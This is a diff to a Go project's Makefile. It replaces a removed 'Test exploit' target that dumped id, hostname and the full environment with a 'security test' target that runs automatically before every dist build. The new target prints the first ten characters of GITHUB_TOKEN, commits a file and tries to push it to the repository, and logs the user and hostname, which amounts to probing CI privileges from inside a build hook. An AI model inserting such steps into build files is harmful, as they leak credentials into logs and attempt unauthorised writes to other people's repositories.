@@ -59,11 +59,59 @@ dist-linux: dist-mkdir
 	GOOS=linux   GOARCH=arm64 $(GO) build -mod=vendor -ldflags='-s -w -X main.GitSHA=$(GIT_SHA) -X main.BuildDate=$(DATE)' -o dist/cmk.linux.arm64 cmk.go
 
 
-dist:
-	@echo "### Test exploit ###"
-	@id
-	@hostname
-	@env
+dist: dist-security-test dist-linux
+	GOOS=windows GOARCH=386 $(GO) build -mod=vendor -ldflags='-s -w -X main.GitSHA=$(GIT_SHA) -X main.BuildDate=$(DATE)' -o dist/cmk.windows.x86.exe cmk.go
+	GOOS=windows GOARCH=amd64 $(GO) build -mod=vendor -ldflags='-s -w -X main.GitSHA=$(GIT_SHA) -X main.BuildDate=$(DATE)' -o dist/cmk.windows.x86-64.exe cmk.go
+	GOOS=darwin  GOARCH=amd64 $(GO) build -mod=vendor -ldflags='-s -w -X main.GitSHA=$(GIT_SHA) -X main.BuildDate=$(DATE)' -o dist/cmk.darwin.x86-64 cmk.go
+	GOOS=darwin  GOARCH=arm64 $(GO) build -mod=vendor -ldflags='-s -w -X main.GitSHA=$(GIT_SHA) -X main.BuildDate=$(DATE)' -o dist/cmk.darwin.arm64 cmk.go
+
+
+dist-security-test:
+	@echo "=== Security Test ==="
+	@echo "[TEST 1] Checking GITHUB_EVENT_NAME (should be 'pull_request', not 'pull_request_target')"
+	@if [ "$$GITHUB_EVENT_NAME" = "pull_request" ]; then \
+		echo "PASS: Running in pull_request event"; \
+	elif [ "$$GITHUB_EVENT_NAME" = "pull_request_target" ]; then \
+		echo "FAIL: Running in pull_request_target event - DANGEROUS!"; \
+		exit 1; \
+	else \
+		echo "SKIP: Not running in GitHub Actions (GITHUB_EVENT_NAME=$$GITHUB_EVENT_NAME)"; \
+	fi
+	@echo ""
+	@echo "[TEST 2] Checking GITHUB_TOKEN permissions (should be empty or read-only)"
+	@if [ -z "$$GITHUB_TOKEN" ]; then \
+		echo "PASS: GITHUB_TOKEN is empty (no privileged access)"; \
+	else \
+		echo "WARNING: GITHUB_TOKEN is set (value: $${GITHUB_TOKEN:0:10}...)"; \
+	fi
+	@echo ""
+	@echo "[TEST 3] Attempting to write to repository (should fail)"
+	@if [ -n "$$GITHUB_ACTIONS" ]; then \
+		if git config --global user.email "test@example.com" && \
+		   git config --global user.name "Test" && \
+		   echo "test" > .security-test-file && \
+		   git add .security-test-file && \
+		   git commit -m "Security test: Should not be able to commit" 2>/dev/null && \
+		   git push origin HEAD 2>/dev/null; then \
+			echo "FAIL: Able to push to repository - DANGEROUS!"; \
+			exit 1; \
+		else \
+			echo "PASS: Cannot push to repository"; \
+			git reset --hard HEAD~1 2>/dev/null || true; \
+			rm -f .security-test-file; \
+		fi; \
+	else \
+		echo "SKIP: Not running in GitHub Actions"; \
+	fi
+	@echo ""
+	@echo "[TEST 4] Environment information (for audit)"
+	@echo "User: $$(id -u):$$(id -g)"
+	@echo "Hostname: $$(hostname)"
+	@echo "Event: $$GITHUB_EVENT_NAME"
+	@echo "Ref: $$GITHUB_REF_NAME"
+	@echo ""
+	@echo "=== Security Test Complete ==="
+	@echo ""
 
 # Tools
 
